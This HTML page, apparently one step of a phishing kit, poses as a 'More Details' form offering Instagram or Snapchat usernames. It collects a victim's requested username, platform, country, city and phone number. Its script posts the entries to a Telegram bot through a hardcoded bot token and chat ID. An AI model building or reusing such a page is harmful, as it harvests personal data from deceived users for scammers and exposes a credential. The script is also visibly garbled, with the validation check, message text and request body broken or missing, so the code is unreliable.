<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>More Details</title>
  <style>
    :root {
      --bg-page: #f4f5f7;
      --bg-panel: #ffffff;
      --bg-inner: #fafafa;
      --border-light: #e1e3e6;
      --text-main: #222222;
      --text-muted: #888888;
      --accent-blue: #0070f3;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
        system-ui, -webkit-system-font, sans-serif;
      background: var(--bg-page);
      color: var(--text-main);
    }

    .page-wrapper {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px 12px;
    }

    .panel {
      width: 100%;
      max-width: 430px;
      background: var(--bg-panel);
      border-radius: 18px;
      box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
      padding: 22px 18px 24px;
    }

    .panel h1 {
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 22px;
    }

    .form-group {
      margin-bottom: 14px;
    }

    label {
      display: block;
      font-size: 13px;
      margin-bottom: 6px;
    }

    input[type="text"],
    input[type="tel"],
    select {
      width: 100%;
      padding: 10px 11px;
      border-radius: 6px;
      border: 1px solid #d1d5db;
      font-size: 14px;
      outline: none;
      background-color: #ffffff;
      transition: border-color 0.15s ease, box-shadow 0.15s ease,
        background-color 0.15s ease;
    }

    input:focus,
    select:focus {
      border-color: var(--accent-blue);
      box-shadow: 0 0 0 1px rgba(0, 112, 243, 0.18);
      background-color: #ffffff;
    }

    .error-message {
      display: none;
      font-size: 11px;
      color: #e11d48; /* Ø£Ø­Ù…Ø± ÙˆØ§Ø¶Ø­ */
      margin-top: 4px;
    }

    .btn-submit {
      width: 100%;
      margin-top: 10px;
      padding: 11px 0;
      border-radius: 6px;
      border: none;
      background: #0070f3;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.15s ease, transform 0.05s ease,
        box-shadow 0.15s ease;
    }

    .btn-submit:active {
      transform: translateY(1px);
      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.25);
    }

    .btn-submit:hover {
      background: #0060d0;
    }

    @media (max-width: 400px) {
      .panel {
        padding: 18px 14px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="page-wrapper">
    <div class="panel">
      <h1>More Details</h1>

      <form id="detailsForm">
        <!-- Requested username -->
        <div class="form-group">
          <label for="requestedUsername">Requested username</label>
          <input
            id="requestedUsername"
            type="text"
            autocomplete="off"
          />
          <div class="error-message" id="err-requestedUsername">
            This form is required.
          </div>
        </div>

        <!-- Platform -->
        <div class="form-group">
          <label for="platform">Platform (Instagram / Snapchat)</label>
          <input
            id="platform"
            type="text"
            autocomplete="off"
          />
          <div class="error-message" id="err-platform">
            This form is required.
          </div>
        </div>

        <!-- Country -->
        <div class="form-group">
          <label for="country">Country</label>
          <select id="country">
            <option value="">Select country</option>
            <option value="United Arab Emirates">United Arab Emirates</option>
            <option value="Qatar">Qatar</option>
            <option value="Saudi Arabia">Saudi Arabia</option>
            <option value="Kuwait">Kuwait</option>
            <option value="Bahrain">Bahrain</option>
            <option value="Oman">Oman</option>
            <option value="Jordan">Jordan</option>
            <option value="Turkey">Turkey</option>
            <!-- Ø§Ù„Ø¨Ø§Ù‚ÙŠ Ù„Ùˆ Ø­Ø§Ø¨ ØªØ¶ÙŠÙÙ‡ Ù„Ø§Ø­Ù‚Ø§Ù‹ -->
          </select>
          <div class="error-message" id="err-country">
            This form is required.
          </div>
        </div>

        <!-- City -->
        <div class="form-group">
          <label for="city">City</label>
          <input
            id="city"
            type="text"
            autocomplete="off"
          />
          <div class="error-message" id="err-city">
            This form is required.
          </div>
        </div>

        <!-- Phone -->
        <div class="form-group">
          <label for="phone">Phone</label>
          <input
            id="phone"
            type="tel"
            autocomplete="off"
            placeholder="+XXX XXX XXX XXX"
          />
          <div class="error-message" id="err-phone">
            This form is required.
          </div>
        </div>

        <button type="submit" class="btn-submit">Next</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById("detailsForm");

    const requestedUsernameInput = document.getElementById("requestedUsername");
    const platformInput = document.getElementById("platform");
    const countrySelect = document.getElementById("country");
    const cityInput = document.getElementById("city");
    const phoneInput = document.getElementById("phone");

    const errors = {
      requestedUsername: document.getElementById("err-requestedUsername"),
      platform: document.getElementById("err-platform"),
      country: document.getElementById("err-country"),
      city: document.getElementById("err-city"),
      phone: document.getElementById("err-phone"),
    };

    function showError(fieldKey, show) {
      errors[fieldKey].style.display = show ? "block" : "none";
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const requestedUsername = requestedUsernameInput.value.trim();
      const platform = platformInput.value.trim();
      const country = countrySelect.value.trim();
      const city = cityInput.value.trim();
      const phone = phoneInput.value.trim();

      let hasError = false;

      if (!requestedUsername) {
        showError("requestedUsername", true);
        hasError = true;
      } else {
        showError("requestedUsername", false);
      }

      if (!platform) {
        showError("platform", true);
        hasError = true;
      } else {
        showError("platform", false);
      }

      if (!country) {
        showError("country", true);
        hasError = true;
      } else {
        showError("country", false);
      }

      if (!city) {
        showError("city", true);
        hasError = true;
      } else {
        showError("city", false);
      }

      if (!phone) {
        showError("phone", true);
        hasError = true;
      } else {
        showError("phone", false);
      }

      // Ù„Ùˆ ÙÙŠ Ø­Ù‚Ù„ ÙØ§Ø¶ÙŠ -> Ù†ÙˆÙ‚Ù Ù‡Ù†Ø§

        return;
      }

        \nðŸ“± Platform: ${platform} +
        \nðŸŒ Country: ${country} +
        \nðŸ™ City: ${city} +
        \nðŸ“ž Phone: ${phone};

      const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
      const chatId = "7811430582";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",

        .then((response) => response.json())
        .then((data) => {

          // window.location.href = "step3.html";

    });
  </script>
</body>
</html>
